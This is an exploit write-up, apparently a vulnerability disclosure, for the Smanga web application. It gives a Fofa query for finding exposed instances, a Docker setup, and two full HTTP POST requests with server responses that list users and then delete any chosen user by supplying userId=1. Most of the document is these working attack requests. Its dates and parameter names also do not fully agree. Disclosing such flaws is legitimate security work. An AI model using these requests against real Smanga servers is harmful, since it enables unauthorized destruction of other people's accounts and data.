#### Unauthorized Deletion of Users

**Exploit Title:** Smanga MediaId Unauthorized Deletion of Users  
**Date:** 2024-04-01  
**Exploit Author:** Shuo Sheng, Jixin Zhang  

##### Description:

Smanga allows unauthorized deletion of any user through its `mediaId`.

##### Fofa Query:

```
title="smanga"
```

##### Installation via Docker:

```dockerfile
docker run -itd --name smanga \
-p 3333:3306 \
-p 9797:80 \
-v /mnt:/mnt \
-v /route/smanga:/data \
lkw199711/smanga;
```

##### Proof of Concept (PoC):

To successfully exploit this vulnerability, you must include `userId=1`.

**Step 1: Fetch User List**

```http
POST /php/public/index.php/user/get HTTP/1.1
Host: 192.168.196.128:9797
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 29
Origin: http://192.168.196.128:9797
Connection: keep-alive
Referer: http://192.168.196.128:9797/

page=1&pageSize=10&userId=1
```

**Response:**

```json
{
  "list": [
    {
      "registerTime": "2025-01-03 10:01:28",
      "nickName": null,
      "mediaLimit": null,
      "editMedia": 1,
      "editUser": 1,
      "updateTime": "2025-01-03 10:01:28",
      "userName": "sanbaosanbao",
      "userId": 12 // This userid is the targetUserId to be deleted
    }
  ]
}
```

**Step 2: Delete Target User**

```http
POST /php/public/index.php/user/delete HTTP/1.1
Host: 192.168.196.128:9797
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 88
Origin: http://192.168.196.128:9797
Connection: keep-alive
Referer: http://192.168.196.128:9797/

targetUserId=12&userId=1
```

**Response:**

```json
{
  "status": "success",
  "message": "user delete success"
}
```

#### 